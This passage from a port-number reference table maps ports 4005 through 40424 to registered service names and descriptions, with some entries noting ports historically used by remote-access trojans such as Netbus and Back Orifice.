port 4005 => pxc-pin - pxc-pin 
port 4006 => pxc-spvr - pxc-spvr 
port 4007 => pxc-splr - pxc-splr 
port 4008 => netcheque - NetCheque accounting  
port 4009 => chimera-hwm - Chimera HWM 
port 4010 => samsung-unidex - Samsung Unidex 
port 4011 => altserviceboot - Alternate Service Boot 
port 4012 => pda-gate - PDA Gate 
port 4013 => acl-manager - ACL Manager 
port 4014 => taiclock - TAICLOCK 
port 4015 => talarian-mcast1 - Talarian Mcast 
port 4016 => talarian-mcast2 - Talarian Mcast 
port 4017 => talarian-mcast3 - Talarian Mcast 
port 4018 => talarian-mcast4 - Talarian Mcast 
port 4019 => talarian-mcast5 - Talarian Mcast 
port 4096 => bre - BRE (Bridge Relay Element) 
port 4097 => patrolview - Patrol View 
port 4098 => drmsfsd - drmsfsd 
port 4099 => dpcp - DPCP 
port 4132 => nuts_dem - NUTS Daemon 
port 4133 => nuts_bootp - NUTS Bootp Server 
port 4134 => nifty-hmi - NIFTY-Serve HMI protocol 
port 4141 => oirtgsvc - Workflow Server 
port 4142 => oidocsvc - Document Server 
port 4143 => oidsr - Document Replication 
port 4144 => compuserve - Compuserve (UNOFFICIALLY) 
port 4160 => jini-discovery - Jini Discovery 
port 4200 => vrml-multi-use - VRML Multi User Systems 
port 4201 => vrml-multi-use - VRML Multi User Systems 
port 4202 => vrml-multi-use - VRML Multi User Systems 
port 4203 => vrml-multi-use - VRML Multi User Systems 
port 4204 => vrml-multi-use - VRML Multi User Systems 
port 4205 => vrml-multi-use - VRML Multi User Systems 
port 4206 => vrml-multi-use - VRML Multi User Systems 
port 4207 => vrml-multi-use - VRML Multi User Systems 
port 4208 => vrml-multi-use - VRML Multi User Systems 
port 4209 => vrml-multi-use - VRML Multi User Systems 
port 4210 => vrml-multi-use - VRML Multi User Systems 
port 4211 => vrml-multi-use - VRML Multi User Systems 
port 4212 => vrml-multi-use - VRML Multi User Systems 
port 4213 => vrml-multi-use - VRML Multi User Systems 
port 4214 => vrml-multi-use - VRML Multi User Systems 
port 4215 => vrml-multi-use - VRML Multi User Systems 
port 4216 => vrml-multi-use - VRML Multi User Systems 
port 4217 => vrml-multi-use - VRML Multi User Systems 
port 4218 => vrml-multi-use - VRML Multi User Systems 
port 4219 => vrml-multi-use - VRML Multi User Systems 
port 4220 => vrml-multi-use - VRML Multi User Systems 
port 4221 => vrml-multi-use - VRML Multi User Systems 
port 4222 => vrml-multi-use - VRML Multi User Systems 
port 4223 => vrml-multi-use - VRML Multi User Systems 
port 4224 => vrml-multi-use - VRML Multi User Systems 
port 4225 => vrml-multi-use - VRML Multi User Systems 
port 4226 => vrml-multi-use - VRML Multi User Systems 
port 4227 => vrml-multi-use - VRML Multi User Systems 
port 4228 => vrml-multi-use - VRML Multi User Systems 
port 4229 => vrml-multi-use - VRML Multi User Systems 
port 4230 => vrml-multi-use - VRML Multi User Systems 
port 4231 => vrml-multi-use - VRML Multi User Systems 
port 4232 => vrml-multi-use - VRML Multi User Systems 
port 4233 => vrml-multi-use - VRML Multi User Systems 
port 4234 => vrml-multi-use - VRML Multi User Systems 
port 4235 => vrml-multi-use - VRML Multi User Systems 
port 4236 => vrml-multi-use - VRML Multi User Systems 
port 4237 => vrml-multi-use - VRML Multi User Systems 
port 4238 => vrml-multi-use - VRML Multi User Systems 
port 4239 => vrml-multi-use - VRML Multi User Systems 
port 4240 => vrml-multi-use - VRML Multi User Systems 
port 4241 => vrml-multi-use - VRML Multi User Systems 
port 4242 => vrml-multi-use - VRML Multi User Systems 
port 4243 => vrml-multi-use - VRML Multi User Systems 
port 4244 => vrml-multi-use - VRML Multi User Systems 
port 4245 => vrml-multi-use - VRML Multi User Systems 
port 4246 => vrml-multi-use - VRML Multi User Systems 
port 4247 => vrml-multi-use - VRML Multi User Systems 
port 4248 => vrml-multi-use - VRML Multi User Systems 
port 4249 => vrml-multi-use - VRML Multi User Systems 
port 4250 => vrml-multi-use - VRML Multi User Systems 
port 4251 => vrml-multi-use - VRML Multi User Systems 
port 4252 => vrml-multi-use - VRML Multi User Systems 
port 4253 => vrml-multi-use - VRML Multi User Systems 
port 4254 => vrml-multi-use - VRML Multi User Systems 
port 4255 => vrml-multi-use - VRML Multi User Systems 
port 4256 => vrml-multi-use - VRML Multi User Systems 
port 4257 => vrml-multi-use - VRML Multi User Systems 
port 4258 => vrml-multi-use - VRML Multi User Systems 
port 4259 => vrml-multi-use - VRML Multi User Systems 
port 4260 => vrml-multi-use - VRML Multi User Systems 
port 4261 => vrml-multi-use - VRML Multi User Systems 
port 4262 => vrml-multi-use - VRML Multi User Systems 
port 4263 => vrml-multi-use - VRML Multi User Systems 
port 4264 => vrml-multi-use - VRML Multi User Systems 
port 4265 => vrml-multi-use - VRML Multi User Systems 
port 4266 => vrml-multi-use - VRML Multi User Systems 
port 4267 => vrml-multi-use - VRML Multi User Systems 
port 4268 => vrml-multi-use - VRML Multi User Systems 
port 4269 => vrml-multi-use - VRML Multi User Systems 
port 4270 => vrml-multi-use - VRML Multi User Systems 
port 4271 => vrml-multi-use - VRML Multi User Systems 
port 4272 => vrml-multi-use - VRML Multi User Systems 
port 4273 => vrml-multi-use - VRML Multi User Systems 
port 4274 => vrml-multi-use - VRML Multi User Systems 
port 4275 => vrml-multi-use - VRML Multi User Systems 
port 4276 => vrml-multi-use - VRML Multi User Systems 
port 4277 => vrml-multi-use - VRML Multi User Systems 
port 4278 => vrml-multi-use - VRML Multi User Systems 
port 4279 => vrml-multi-use - VRML Multi User Systems 
port 4280 => vrml-multi-use - VRML Multi User Systems 
port 4281 => vrml-multi-use - VRML Multi User Systems 
port 4282 => vrml-multi-use - VRML Multi User Systems 
port 4283 => vrml-multi-use - VRML Multi User Systems 
port 4284 => vrml-multi-use - VRML Multi User Systems 
port 4285 => vrml-multi-use - VRML Multi User Systems 
port 4286 => vrml-multi-use - VRML Multi User Systems 
port 4287 => vrml-multi-use - VRML Multi User Systems 
port 4288 => vrml-multi-use - VRML Multi User Systems 
port 4289 => vrml-multi-use - VRML Multi User Systems 
port 4290 => vrml-multi-use - VRML Multi User Systems 
port 4291 => vrml-multi-use - VRML Multi User Systems 
port 4292 => vrml-multi-use - VRML Multi User Systems 
port 4293 => vrml-multi-use - VRML Multi User Systems 
port 4294 => vrml-multi-use - VRML Multi User Systems 
port 4295 => vrml-multi-use - VRML Multi User Systems 
port 4296 => vrml-multi-use - VRML Multi User Systems 
port 4297 => vrml-multi-use - VRML Multi User Systems 
port 4298 => vrml-multi-use - VRML Multi User Systems 
port 4299 => vrml-multi-use - VRML Multi User Systems 
port 4300 => corelccam - Corel CCam 
port 4321 => rwhois - Remote Who Is 
port 4343 => unicall - UNICALL 
port 4344 => vinainstall - VinaInstall 
port 4345 => m4-network-as - Macro 4 Network AS 
port 4346 => elanlm - ELAN LM 
port 4347 => lansurveyor - LAN Surveyor 
port 4348 => itose - ITOSE 
port 4349 => fsportmap - File System Port Map 
port 4350 => net-device - Net Device 
port 4351 => plcy-net-svcs - PLCY Net Services 
port 4353 => f5-iquery - F5 iQuery  
port 4442 => saris - Saris 
port 4443 => pharos - Pharos 
port 4444 => krb524 - KRB524 (or nv-video - NV Video default) 
port 4445 => upnotifyp - UPNOTIFYP 
port 4446 => n1-fwp - N1-FWP 
port 4447 => n1-rmgmt - N1-RMGMT 
port 4448 => asc-slmd - ASC Licence Manager 
port 4449 => privatewire - PrivateWire 
port 4450 => camp - Camp 
port 4451 => ctisystemmsg - CTI System Msg 
port 4452 => ctiprogramload - CTI Program Load 
port 4453 => nssalertmgr - NSS Alert Manager 
port 4454 => nssagentmgr - NSS Agent Manager 
port 4455 => prchat-user - PR Chat User 
port 4456 => prchat-server - PR Chat Server 
port 4457 => prRegister - PR Register 
port 4500 => sae-urn - sae-urn 
port 4501 => urn-x-cdchoice - urn-x-cdchoice 
port 4545 => worldscores - WorldScores 
port 4546 => sf-lm - SF License Manager (Sentinel) 
port 4547 => lanner-lm - Lanner License Manager 
port 4600 => piranha1 - Piranha1 
port 4601 => piranha2 - Piranha2 
port 4672 => rfa - remote file access server 
port 4800 => iims - Icona Instant Messenging System 
port 4801 => iwec - Icona Web Embedded Chat 
port 4802 => ilss - Icona License System Server 
port 4827 => htcp - HTCP 
port 4868 => phrelay - Photon Relay 
port 4869 => phrelaydbg - Photon Relay Debug 
port 4885 => abbs - ABBS 
port 5000 => commplex-main - commplex-main (or Sokets de Trois 1 TROJAN) 
port 5001 => commplex-link - commplex-link (or Sokets de Trois 1 TROJAN) 
port 5002 => rfe - radio free ethernet 
port 5003 => fmpro-internal - FileMaker, Inc. - Proprietary transport 
port 5004 => avt-profile-1 - avt-profile-1 
port 5005 => avt-profile-2 - avt-profile-2 
port 5010 => telelpathstart - TelepathStart 
port 5011 => telelpathattack - TelepathAttack 
port 5020 => zenginkyo-1 - zenginkyo-1 
port 5021 => zenginkyo-2 - zenginkyo-2 
port 5042 => asnaacceler8db - asnaacceler8db 
port 5050 => mmcc - multimedia conference control tool 
port 5051 => ita-agent - ITA Agent 
port 5052 => ita-manager - ITA Manager 
port 5060 => sip - SIP 
port 5069 => i-net-2000-npr - I/Net 2000-NPR 
port 5145 => rmonitor_secure - rmonitor_secure 
port 5150 => atmp - Ascend Tunnel Management Protocol 
port 5151 => esri_sde - ESRI SDE Instance 
port 5152 => sde-discovery - ESRI SDE Instance Discovery 
port 5165 => ife_icorp - ife_1corp 
port 5190 => aol - America-Online 
port 5191 => aol-1 - AmericaOnline1 
port 5192 => aol-2 - AmericaOnline2 
port 5193 => aol-3 - AmericaOnline3 
port 5200 => targus-aib1 - Targus AIB 1  
port 5201 => targus-aib2 - Targus AIB 2  
port 5202 => targus-tnts1 - Targus TNTS 1 
port 5203 => targus-tnts2 - Targus TNTS 2 
port 5236 => padl2sim - padl2sim 
port 5272 => pk - PK 
port 5300 => hacl-hb - HA cluster heartbeat 
port 5301 => hacl-gs - HA cluster general services 
port 5302 => hacl-cfg - HA cluster configuration 
port 5303 => hacl-probe - HA cluster probing 
port 5304 => hacl-local - HA Cluster Commands 
port 5305 => hacl-test - HA Cluster Test 
port 5306 => sun-mc-grp - Sun MC Group 
port 5307 => sco-aip - SCO AIP 
port 5308 => cfengine - CFengine 
port 5309 => jprinter - J Printer 
port 5310 => outlaws - Outlaws 
port 5311 => tmlogin - TM Login 
port 5400 => excerpt - Excerpt Search 
port 5401 => excerpts - Excerpt Search Secure 
port 5402 => mftp - MFTP 
port 5403 => hpoms-ci-lstn - HPOMS-CI-LSTN 
port 5404 => hpoms-dps-lstn - HPOMS-DPS-LSTN 
port 5405 => netsupport - NetSupport 
port 5406 => systemics-sox - Systemics Sox 
port 5407 => foresyte-clear - Foresyte-Clear 
port 5408 => foresyte-sec - Foresyte-Sec 
port 5409 => salient-dtasrv - Salient Data Server 
port 5410 => salient-usrmgr - Salient User Manager 
port 5411 => actnet - ActNet 
port 5412 => continuus - Continuus 
port 5413 => wwiotalk - WWIOTALK 
port 5414 => statusd - StatusD 
port 5415 => ns-server - NS Server 
port 5416 => sns-gateway - SNS Gateway 
port 5417 => sns-agent - SNS Agent 
port 5418 => mcntp - MCNTP 
port 5419 => dj-ice - DJ-ICE 
port 5420 => cylink-c - Cylink-C 
port 5454 => apc-tcp-udp-4 - apc-tcp-udp-4 
port 5455 => apc-tcp-udp-5 - apc-tcp-udp-5 
port 5456 => apc-tcp-udp-6 - apc-tcp-udp-6 
port 5500 => fcp-addr-srvr1 - fcp-addr-srvr1 
port 5501 => fcp-addr-srvr2 - fcp-addr-srvr2 
port 5502 => fcp-srvr-inst1 - fcp-srvr-inst1 
port 5503 => fcp-srvr-inst2 - fcp-srvr-inst2 
port 5504 => fcp-cics-gw1 - fcp-cics-gw1 
port 5555 => personal-agent - Personal Agent (or HP Omniback) 
port 5599 => esinstall - Enterprise Security Remote Install 
port 5600 => esmmanager - Enterprise Security Manager 
port 5601 => esmagent - Enterprise Security Agent 
port 5602 => a1-msc - A1-MSC 
port 5603 => a1-bs - A1-BS 
port 5604 => a3-sdunode - A3-SDUNode 
port 5605 => a4-sdunode - A4-SDUNode 
port 5631 => pcanywheredata - pcANYWHEREdata 
port 5632 => pcanywherestat - pcANYWHEREstat 
port 5678 => rrac - Remote Replication Agent Connection 
port 5679 => dccm - Direct Cable Connect Manager 
port 5713 => proshareaudio - proshare conf audio 
port 5714 => prosharevideo - proshare conf video 
port 5715 => prosharedata - proshare conf data  
port 5716 => prosharerequest - proshare conf request 
port 5717 => prosharenotify - proshare conf notify  
port 5729 => openmail - Openmail User Agent Layer 
port 5741 => ida-discover1 - IDA Discover Port 1 
port 5742 => ida-discover2 - IDA Discover Port 2 
port 5745 => fcopy-server - fcopy-server 
port 5746 => fcopys-server - fcopys-server 
port 5755 => openmailg - OpenMail Desk Gateway server 
port 5757 => x500ms - OpenMail X.500 Directory Server 
port 5766 => openmailns - OpenMail NewMail Server 
port 5767 => s-openmail - OpenMail Suer Agent Layer (Secure) 
port 5768 => openmailpxy - OpenMail CMTS Server 
port 5968 => mppolicy-v5 - mppolicy-v5 
port 5969 => mppolicy-mgr - mppolicy-mgr 
port 6000 => x11 - X Windows System 
port 6001 => x11 - X Windows System 
port 6002 => x11 - X Windows System 
port 6003 => x11 - X Windows System 
port 6110 => softcm - HP SoftBench CM 
port 6111 => spc - HP SoftBench Sub-Process Control 
port 6112 => dtspcd - dtspcd 
port 6123 => backup-express - Backup Express 
port 6141 => meta-corp - Meta Corporation License Manager 
port 6142 => aspentec-lm - Aspen Technology License Manager 
port 6143 => watershed-lm - Watershed License Manager 
port 6144 => statsci1-lm - StatSci License Manager - 1 
port 6145 => statsci2-lm - StatSci License Manager - 2 
port 6146 => lonewolf-lm - Lone Wolf Systems License Manager 
port 6147 => montage-lm - Montage License Manager 
port 6148 => ricardo-lm - Ricardo North America License Manager 
port 6149 => tal-pod - tal-pod  
port 6253 => crip - CRIP 
port 6389 => clariion-evr01 - clariion-evr01 
port 6455 => skip-cert-recv - SKIP Certificate Receive 
port 6471 => lvision-lm - LVision License Manager 
port 6500 => boks - BoKS Master 
port 6501 => boks_servc - BoKS Servc 
port 6502 => boks_servm - BoKS Servm 
port 6503 => boks_clntd - BoKS Clntd 
port 6505 => badm_priv - BoKS Admin Private Port 
port 6506 => badm_pub - BoKS Admin Public Port 
port 6507 => bdir_priv - BoKS Dir Server, Private Port 
port 6508 => bdir_pub - BoKS Dir Server, Public Port 
port 6547 => apc-tcp-udp-1 - apc-tcp-udp-1 
port 6548 => apc-tcp-udp-2 - apc-tcp-udp-2 
port 6549 => apc-tcp-udp-3 - apc-tcp-udp-3 
port 6550 => fg-sysupdate - fg-sysupdate 
port 6558 => xdsxdm - xdsxdm 
port 6665 => ircu - IRCU (IRCD/IRC/Internet Relay Chat) 
port 6666 => ircu - IRCU (IRCD/IRC/Internet Relay Chat) 
port 6667 => ircu - IRCU (IRCD/IRC/Internet Relay Chat) 
port 6668 => ircu - IRCU (IRCD/IRC/Internet Relay Chat) 
port 6669 => ircu - IRCU (IRCD/IRC/Internet Relay Chat) 
port 6670 => vocaltec-gold - Vocaltec Global Online Directory 
port 6672 => vision_server - vision_server 
port 6673 => vision_elmd - vision_elmd 
port 6701 => kti-icad-srvr - KTI/ICAD Nameserver 
port 6790 => hnmp - HNMP 
port 6831 => ambit-lm - ambit-lm 
port 6841 => netmo-default - Netmo Default 
port 6842 => netmo-http - Netmo HTTP 
port 6961 => jmact3 - JMACT3 
port 6962 => jmevt2 - jmevt2 
port 6963 => swismgr1 - swismgr1 
port 6964 => swismgr2 - swismgr2 
port 6965 => swistrap - swistrap 
port 6966 => swispol - swispol 
port 6969 => acmsoda - acmsoda 
port 6998 => iatp-highpri - IATP-highPri 
port 6999 => iatp-normalpri - IATP-normalPri 
port 7000 => afs3-fileserver - file server itself 
port 7001 => afs3-callback - callbacks to cache managers 
port 7002 => afs3-prserver - users & groups database 
port 7003 => afs3-vlserver - volume location database 
port 7004 => afs3-kaserver - AFS/Kerberos authentication service 
port 7005 => afs3-volser - volume managment server 
port 7006 => afs3-errors - error interpretation service 
port 7007 => afs3-bos - basic overseer process 
port 7008 => afs3-update - server-to-server updater 
port 7009 => afs3-rmtsys - remote cache manager service 
port 7010 => ups-onlinet - onlinet uninterruptable power supplies 
port 7011 => talon-disc - Talon Discovery Port 
port 7012 => talon-engine - Talon Engine 
port 7020 => dpserve - DP Serve 
port 7021 => dpserveadmin - DP Serve Admin 
port 7070 => arcp - ARCP 
port 7099 => lazy-ptop - lazy-ptop 
port 7100 => font-service - X Font Service 
port 7121 => virprot-lm - Virtual Prototypes License Manager 
port 7174 => clutild - Clutild 
port 7200 => fodms - FODMS FLIP 
port 7201 => dlip - DLIP 
port 7300 => netmon - Net Monitor TROJAN (or swx - The Swiss Exchange) 
port 7301 => netmon - Net Monitor TROJAN (or swx - The Swiss Exchange) 
port 7300 => swx - The Swiss Exchange 
port 7301 => swx - The Swiss Exchange 
port 7302 => swx - The Swiss Exchange 
port 7303 => swx - The Swiss Exchange 
port 7304 => swx - The Swiss Exchange 
port 7305 => swx - The Swiss Exchange 
port 7306 => swx - The Swiss Exchange 
port 7307 => swx - The Swiss Exchange 
port 7308 => swx - The Swiss Exchange 
port 7309 => swx - The Swiss Exchange 
port 7310 => swx - The Swiss Exchange 
port 7311 => swx - The Swiss Exchange 
port 7312 => swx - The Swiss Exchange 
port 7313 => swx - The Swiss Exchange 
port 7314 => swx - The Swiss Exchange 
port 7315 => swx - The Swiss Exchange 
port 7316 => swx - The Swiss Exchange 
port 7317 => swx - The Swiss Exchange 
port 7318 => swx - The Swiss Exchange 
port 7319 => swx - The Swiss Exchange 
port 7320 => swx - The Swiss Exchange 
port 7321 => swx - The Swiss Exchange 
port 7322 => swx - The Swiss Exchange 
port 7323 => swx - The Swiss Exchange 
port 7324 => swx - The Swiss Exchange 
port 7325 => swx - The Swiss Exchange 
port 7326 => swx - The Swiss Exchange 
port 7327 => swx - The Swiss Exchange 
port 7328 => swx - The Swiss Exchange 
port 7329 => swx - The Swiss Exchange 
port 7330 => swx - The Swiss Exchange 
port 7331 => swx - The Swiss Exchange 
port 7332 => swx - The Swiss Exchange 
port 7333 => swx - The Swiss Exchange 
port 7334 => swx - The Swiss Exchange 
port 7335 => swx - The Swiss Exchange 
port 7336 => swx - The Swiss Exchange 
port 7337 => swx - The Swiss Exchange 
port 7338 => swx - The Swiss Exchange 
port 7339 => swx - The Swiss Exchange 
port 7340 => swx - The Swiss Exchange 
port 7341 => swx - The Swiss Exchange 
port 7342 => swx - The Swiss Exchange 
port 7343 => swx - The Swiss Exchange 
port 7344 => swx - The Swiss Exchange 
port 7345 => swx - The Swiss Exchange 
port 7346 => swx - The Swiss Exchange 
port 7347 => swx - The Swiss Exchange 
port 7348 => swx - The Swiss Exchange 
port 7349 => swx - The Swiss Exchange 
port 7350 => swx - The Swiss Exchange 
port 7351 => swx - The Swiss Exchange 
port 7352 => swx - The Swiss Exchange 
port 7353 => swx - The Swiss Exchange 
port 7354 => swx - The Swiss Exchange 
port 7355 => swx - The Swiss Exchange 
port 7356 => swx - The Swiss Exchange 
port 7357 => swx - The Swiss Exchange 
port 7358 => swx - The Swiss Exchange 
port 7359 => swx - The Swiss Exchange 
port 7360 => swx - The Swiss Exchange 
port 7361 => swx - The Swiss Exchange 
port 7362 => swx - The Swiss Exchange 
port 7363 => swx - The Swiss Exchange 
port 7364 => swx - The Swiss Exchange 
port 7365 => swx - The Swiss Exchange 
port 7366 => swx - The Swiss Exchange 
port 7367 => swx - The Swiss Exchange 
port 7368 => swx - The Swiss Exchange 
port 7369 => swx - The Swiss Exchange 
port 7370 => swx - The Swiss Exchange 
port 7371 => swx - The Swiss Exchange 
port 7372 => swx - The Swiss Exchange 
port 7373 => swx - The Swiss Exchange 
port 7374 => swx - The Swiss Exchange 
port 7375 => swx - The Swiss Exchange 
port 7376 => swx - The Swiss Exchange 
port 7377 => swx - The Swiss Exchange 
port 7378 => swx - The Swiss Exchange 
port 7379 => swx - The Swiss Exchange 
port 7380 => swx - The Swiss Exchange 
port 7381 => swx - The Swiss Exchange 
port 7382 => swx - The Swiss Exchange 
port 7383 => swx - The Swiss Exchange 
port 7384 => swx - The Swiss Exchange 
port 7385 => swx - The Swiss Exchange 
port 7386 => swx - The Swiss Exchange 
port 7387 => swx - The Swiss Exchange 
port 7388 => swx - The Swiss Exchange 
port 7389 => swx - The Swiss Exchange 
port 7390 => swx - The Swiss Exchange 
port 7391 => swx - The Swiss Exchange 
port 7392 => swx - The Swiss Exchange 
port 7393 => swx - The Swiss Exchange 
port 7394 => swx - The Swiss Exchange 
port 7395 => swx - The Swiss Exchange 
port 7396 => swx - The Swiss Exchange 
port 7397 => swx - The Swiss Exchange 
port 7398 => swx - The Swiss Exchange 
port 7399 => swx - The Swiss Exchange 
port 7395 => winqedit - winqedit 
port 7426 => pmdmgr - OpenView DM Postmaster Manager 
port 7427 => oveadmgr - OpenView DM Event Agent Manager 
port 7428 => ovladmgr - OpenView DM Log Agent Manager 
port 7429 => opi-sock - OpenView DM rqt communication 
port 7430 => xmpv7 - OpenView DM xmpv7 api pipe 
port 7431 => pmd - OpenView DM ovc/xmpv3 api pipe 
port 7437 => faximum - Faximum 
port 7491 => telops-lmd - telops-lmd 
port 7511 => pafec-lm - pafec-lm 
port 7544 => nta-ds - FlowAnalyzer DisplayServer 
port 7545 => nta-us - FlowAnalyzer UtilityServer 
port 7566 => vsi-omega - VSI Omega	 
port 7570 => aries-kfinder - Aries Kfinder 
port 7588 => sun-lm - Sun License Manager 
port 7633 => pmdfmgt - PMDF Management 
port 7777 => cbt - cbt 
port 7781 => accu-lmgr - accu-lmgr 
port 7932 => t2-drm - Tier 2 Data Resource Manager 
port 7933 => t2-brm - Tier 2 Business Rules Manager 
port 7967 => supercell - Supercell 
port 7980 => quest-vista - Quest Vista 
port 7999 => irdmi2 - iRDMI2 
port 8000 => irdmi - iRDMI 
port 8001 => vcom-tunnel - VCOM Tunnel 
port 8008 => http-alt - HTTP Alternate 
port 8032 => pro-ed - ProEd 
port 8033 => mindprint - MindPrint 
port 8080 => http-alt - HTTP Alternate (see port 80) 
port 8160 => patrol - Patrol 
port 8161 => patrol-snmp - Patrol SNMP 
port 8200 => trivnet1 - TRIVNET 
port 8201 => trivnet2 - TRIVNET 
port 8204 => lm-perfworks - LM Perfworks 
port 8205 => lm-instmgr - LM Instmgr 
port 8206 => lm-dta - LM Dta 
port 8207 => lm-sserver - LM SServer 
port 8351 => server-find - Server Find 
port 8376 => cruise-enum - Cruise ENUM 
port 8377 => cruise-swroute - Cruise SWROUTE 
port 8378 => cruise-config - Cruise CONFIG 
port 8379 => cruise-diags - Cruise DIAGS 
port 8380 => cruise-update - Cruise UPDATE 
port 8400 => cvd - cvd 
port 8401 => sabarsd - sabarsd 
port 8402 => abarsd - abarsd 
port 8403 => admind - admind 
port 8450 => npmp - npmp 
port 8473 => vp2p - Virtual Point to Point 
port 8554 => rtsp-alt - RTSP Alternate (see port 554) 
port 8733 => ibus - iBus 
port 8765 => ultraseek-http - Ultraseek HTTP 
port 8880 => cddbp-alt - CDDBP 
port 8888 => ddi-tcp-1 - NewsEDGE server TCP (TCP 1) 
port 8889 => ddi-tcp-2 - Desktop Data TCP 1 
port 8890 => ddi-tcp-3 - Desktop Data TCP 2 
port 8891 => ddi-tcp-4 - Desktop Data TCP 3: NESS application 
port 8892 => ddi-tcp-5 - Desktop Data TCP 4: FARM product 
port 8893 => ddi-tcp-6 - Desktop Data TCP 5: NewsEDGE/Web application 
port 8894 => ddi-tcp-7 - Desktop Data TCP 6: COAL application 
port 8900 => jmb-cds1 - JMB-CDS 1 
port 8901 => jmb-cds2 - JMB-CDS 2 
port 9000 => cslistener - CSlistener 
port 9006 => sctp - SCTP 
port 9090 => websm - WebSM 
port 9160 => netlock1 - NetLOCK1 
port 9161 => netlock2 - NetLOCK2 
port 9162 => netlock3 - NetLOCK3 
port 9163 => netlock4 - NetLOCK4 
port 9164 => netlock5 - NetLOCK5 
port 9200 => wap-wsp - WAP connectionless session service 
port 9201 => wap-wsp-wtp - WAP session service 
port 9202 => wap-wsp-s - WAP secure connectionless session service 
port 9203 => wap-wsp-wtp-s - WAP secure session service 
port 9204 => wap-vcard - WAP vCard 
port 9205 => wap-vcal - WAP vCal 
port 9206 => wap-vcard-s - WAP vCard Secure 
port 9207 => wap-vcal-s - WAP vCal Secure 
port 9321 => guibase - guibase 
port 9343 => mpidcmgr - MpIdcMgr 
port 9374 => fjdmimgr - fjdmimgr 
port 9396 => fjinvmgr - fjinvmgr 
port 9397 => mpidcagt - MpIdcAgt 
port 9500 => ismserver - ismserver 
port 9535 => man - man 
port 9594 => msgsys - Message System 
port 9595 => pds - Ping Discovery Service 
port 9876 => sd - Session Director 
port 9888 => cyborg-systems - CYBORG Systems 
port 9898 => monkeycom - MonkeyCom 
port 9992 => palace - Palace 
port 9993 => palace - Palace 
port 9994 => palace - Palace 
port 9995 => palace - Palace 
port 9996 => palace - Palace 
port 9997 => palace - Palace 
port 9998 => distinct32 - Distinct32 
port 9999 => distinct - distinct 
port 10000 => ndmp - Network Data Management Protocol 
port 10007 => mvs-capacity - MVS Capacity 
port 10080 => amanda - Amanda  
port 10288 => blocks - Blocks  
port 11000 => irisa - IRISA 
port 11001 => metasys - Metasys 
port 11111 => vce - Viral Computing Environment (VCE) 
port 11367 => atm-uhas - ATM UHAS 
port 12000 => entextxid - IBM Enterprise Extender SNA XID Exchange 
port 12001 => entextnetwk - IBM Enterprise Extender SNA COS Network Priority 
port 12002 => entexthigh - IBM Enterprise Extender SNA COS High Priority 
port 12003 => entextmed - IBM Enterprise Extender SNA COS Medium Priority 
port 12004 => entextlow - IBM Enterprise Extender SNA COS Low Priority 
port 12076 => gjamer - GJamer TROJAN 
port 12345 => netbus - Netbus TROJAN 
port 12346 => netbus - Netbus TROJAN 
port 12753 => tsaf - tsaf port  
port 13160 => i-zipqd - I-ZIPQD 
port 13720 => bprd - BPRD Protocol (VERITAS NetBackup) 
port 13721 => bpbrm - BPBRM Protocol (VERITAS NetBackup) 
port 13722 => bpjava-msvc - BP Java MSVC Protocol 
port 13782 => bpcd - VERITAS NetBackup 
port 13783 => vopied - VOPIED Protocol 
port 13818 => dsmcc-config - DSMCC Config 
port 13819 => dsmcc-session - DSMCC Session Messages 
port 13820 => dsmcc-passthru - DSMCC Pass-Thru Messages 
port 13821 => dsmcc-download - DSMCC Download Protocol 
port 13822 => dsmcc-ccp - DSMCC Channel Change Protocol 
port 14001 => itu-sccp-ss7 - ITU SCCP (SS7) 
port 16360 => netserialext1 - netserialext1 
port 16361 => netserialext2 - netserialext2 
port 16367 => netserialext3 - netserialext3 
port 16368 => netserialext4 - netserialext4 
port 17007 => isode-dua - isode-dua 
port 17219 => chipper - Chipper 
port 18000 => biimenu - Beckman Instruments, Inc. 
port 19410 => hp-sco - hp-sco  
port 19411 => hp-sca - hp-sca 
port 19541 => jcp - JCP Client 
port 20000 => dnp - DNP (or Millennium TROJAN) 
port 20670 => track - Track 
port 21554 => girlfriend - Girlfriend TROJAN 
port 21845 => webphone - webphone 
port 21846 => netspeak-is - NetSpeak Corp. Directory Services 
port 21847 => netspeak-cs - NetSpeak Corp. Connection Services 
port 21848 => netspeak-acd - NetSpeak Corp. Automatic Call Distribution 
port 21849 => netspeak-cps - NetSpeak Corp. Credit Processing System 
port 22000 => snapenetio - SNAPenetIO 
port 22001 => optocontrol - OptoControl 
port 22273 => wnn6 - wnn6 
port 22555 => vocaltec-wconf - Vocaltec Web Conference 
port 22800 => aws-brf - Telerate Information Platform LAN 
port 22951 => brf-gw - Telerate Information Platform WAN 
port 24000 => med-ltp - med-ltp 
port 24001 => med-fsp-rx - med-fsp-rx 
port 24002 => med-fsp-tx - med-fsp-tx 
port 24003 => med-supp - med-supp 
port 24004 => med-ovw - med-ovw 
port 24005 => med-ci - med-ci 
port 24006 => med-net-svc - med-net-svc 
port 24386 => intel_rci - Intel RCI  
port 25000 => icl-twobase1 - icl-twobase1 
port 25001 => icl-twobase2 - icl-twobase2 
port 25002 => icl-twobase3 - icl-twobase3 
port 25003 => icl-twobase4 - icl-twobase4 
port 25004 => icl-twobase5 - icl-twobase5 
port 25005 => icl-twobase6 - icl-twobase6 
port 25006 => icl-twobase7 - icl-twobase7 
port 25007 => icl-twobase8 - icl-twobase8 
port 25008 => icl-twobase9 - icl-twobase9 
port 25009 => icl-twobase10 - icl-twobase10 
port 25793 => vocaltec-hos - Vocaltec Address Server 
port 26000 => quake - quake 
port 26208 => wnn6-ds - wnn6-ds 
port 27000 => flex-lm - FLEX LM (1-10) 
port 27001 => flex-lm - FLEX LM (1-10) 
port 27002 => flex-lm - FLEX LM (1-10) 
port 27003 => flex-lm - FLEX LM (1-10) 
port 27004 => flex-lm - FLEX LM (1-10) 
port 27005 => flex-lm - FLEX LM (1-10) 
port 27006 => flex-lm - FLEX LM (1-10) 
port 27007 => flex-lm - FLEX LM (1-10) 
port 27008 => flex-lm - FLEX LM (1-10) 
port 27009 => flex-lm - FLEX LM (1-10) 
port 27999 => tw-auth-key - TW Authentication/Key Distribution and  
port 31337 => bo - Back Orifice TROJAN (or Netpatch TROJAN) 
port 31338 => deepbo - Deep Back Orifice TROJAN 
port 32768 => filenet-tms - Filenet TMS 
port 32769 => filenet-rpc - Filenet RPC 
port 32770 => filenet-nch - Filenet NCH 
port 33434 => traceroute - traceroute use 
port 36865 => kastenxpipe - KastenX Pipe 
port 40421 => mp - Master's Paradise (hacked) TROJAN 
port 40422 => mp - Master's Paradise (hacked) TROJAN 
port 40423 => mp - Master's Paradise (hacked) TROJAN 
port 40424 => mp - Master's Paradise (hacked) TROJAN 
